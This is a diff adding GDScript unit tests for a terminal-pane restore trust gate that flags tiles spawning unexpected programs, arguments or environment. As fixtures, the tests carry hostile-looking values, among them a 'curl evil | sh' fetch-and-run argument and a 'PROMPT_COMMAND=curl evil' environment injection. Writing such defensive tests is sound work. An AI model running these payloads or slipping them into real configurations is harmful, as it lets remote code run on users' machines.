@@ -101,6 +101,40 @@ func test_sanitize_shell_args_rejects_junk_and_caps():
 	# Non-array input degrades to an empty list.
 	assert_eq(PaneTypes.sanitize_shell_args("not-an-array"), [])
 
+# ── PaneTypes.tile_spawns_untrusted (restore trust gate) ───────────────
+
+func test_trust_gate_flags_a_different_program():
+	assert_true(PaneTypes.tile_spawns_untrusted(
+		{"settings": {"type": "terminal", "shell": "/bin/zsh"}}, "/bin/bash", ""))
+	# The restore path reads `command` first; the gate must read the same key.
+	assert_true(PaneTypes.tile_spawns_untrusted(
+		{"settings": {"type": "terminal", "command": "/tmp/evil"}}, "/bin/bash", ""))
+	assert_false(PaneTypes.tile_spawns_untrusted(
+		{"settings": {"type": "terminal", "command": "/bin/bash"}}, "/bin/bash", ""))
+	assert_false(PaneTypes.tile_spawns_untrusted(
+		{"settings": {"type": "terminal"}}, "/bin/bash", ""))
+
+func test_trust_gate_flags_argv_and_env_payloads():
+	# An argv payload spawns whatever it names: `["-c", "…"]` is code, and it
+	# used to pass the gate because only `shell` was examined.
+	assert_true(PaneTypes.tile_spawns_untrusted(
+		{"settings": {"type": "terminal", "shell_args": ["-c", "curl evil | sh"]}},
+		"/bin/bash", ""))
+	# An env payload is code too once a shell evaluates it (PROMPT_COMMAND,
+	# BASH_ENV), so a non-default environment is a trust decision as well.
+	assert_true(PaneTypes.tile_spawns_untrusted(
+		{"settings": {"type": "terminal", "shell_env": "PROMPT_COMMAND=curl evil"}},
+		"/bin/bash", ""))
+	assert_false(PaneTypes.tile_spawns_untrusted(
+		{"settings": {"type": "terminal", "shell_env": "   "}}, "/bin/bash", ""))
+
+func test_trust_gate_allows_the_users_own_defaults():
+	# A tile that repeats the user's configured env/args is not a new decision.
+	assert_false(PaneTypes.tile_spawns_untrusted(
+		{"settings": {"type": "terminal", "shell_env": "EDITOR=vim", "shell_args": []}},
+		"/bin/bash", "EDITOR=vim"))
+	assert_false(PaneTypes.tile_spawns_untrusted({"settings": "not-a-dict"}, "/bin/bash", ""))
+
 # ── PaneBody typed settings application ────────────────────────────────
 
 func test_pane_body_ignores_unknown_and_bad_type_keys():
